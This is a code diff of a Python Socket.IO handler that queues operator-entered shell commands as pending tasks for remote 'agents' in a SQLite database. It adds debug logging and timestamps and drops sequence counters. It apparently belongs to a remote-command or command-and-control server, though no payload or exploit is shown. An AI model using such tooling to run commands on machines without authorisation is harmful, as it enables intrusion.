@@ -23,45 +23,46 @@ def init_socket_handlers(socketio):
     @socketio.on('terminal_command')
     def handle_terminal_command(data):
         try:
-            # Add command sequence tracking
-            if not hasattr(handle_terminal_command, 'command_counter'):
-                handle_terminal_command.command_counter = {}
-            
-            agent_id = data['agent_id']
-            command = data['command']
-            
-            # Initialize counter for agent if not exists
-            if agent_id not in handle_terminal_command.command_counter:
-                handle_terminal_command.command_counter[agent_id] = 0
-            
-            # Increment command counter
-            handle_terminal_command.command_counter[agent_id] += 1
-            seq_id = handle_terminal_command.command_counter[agent_id]
+            print(f"[TERMINAL] Received command for {data['agent_id']}: {data['command']}")  # Debug
             
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             
+            # Create task with proper terminal flag
             task_data = {
-                'cmd': command,
+                'cmd': data['command'],
                 'terminal': True,
-                'seq_id': seq_id  # Add sequence ID
+                'timestamp': datetime.now().isoformat()
             }
             
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
-                    (None, agent_id, 'shell', json.dumps(task_data),
-                    'pending', datetime.now().isoformat(), None))
+                    (None, 
+                    data['agent_id'], 
+                    'shell', 
+                    json.dumps(task_data),
+                    'pending',
+                    datetime.now().isoformat(),
+                    None))
             
             conn.commit()
             task_id = c.lastrowid
             conn.close()
             
+            print(f"[TERMINAL] Created task {task_id} for command")  # Debug
+            
             emit('terminal_output', {
-                'agent_id': agent_id,
-                'command': command,
-                'output': f"[+] Command queued (Task ID: {task_id})",
-                'task_id': task_id,
-                'seq_id': seq_id  # Include sequence ID
-            }, room=f"terminal_{agent_id}")
+                'agent_id': data['agent_id'],
+                'command': data['command'],
+                'output': f"Command queued (Task ID: {task_id})",
+                'task_id': task_id
+            }, room=f"terminal_{data['agent_id']}")
+            
+        except Exception as e:
+            print(f"[TERMINAL ERROR] {str(e)}")  # Debug
+            emit('terminal_output', {
+                'agent_id': data['agent_id'],
+                'error': f"Command submission failed: {str(e)}"
+            }, room=f"terminal_{data['agent_id']}")
             
         except Exception as e:
             emit('terminal_output', {
